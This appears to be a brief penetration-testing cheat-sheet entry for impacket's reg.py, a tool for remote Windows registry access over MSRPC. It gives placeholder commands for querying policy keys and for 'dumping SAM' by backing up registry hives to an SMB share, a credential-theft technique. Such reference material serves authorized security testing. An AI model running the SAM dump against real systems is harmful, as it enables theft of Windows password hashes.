# reg.py (imp) 

% impacket-smb-msrpc, windows, smb, msrpc

## desc
```
Remote registry manipulation tool through the [MS-RRP] MSRPC Interface
```


## reg - query registry info remotely
#plateform/linux #target/remote #cat/RECON 
```
reg.py '<domain_fqdn>/<user>:<password>'@<ip> query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
```
## reg - dump sam remotely
#plateform/linux #target/remote #cat/RECON 
```
reg.py '<domain_fqdn>/<user>:<password>'@<ip>  backup -o '<smb_share_UNC>'
```

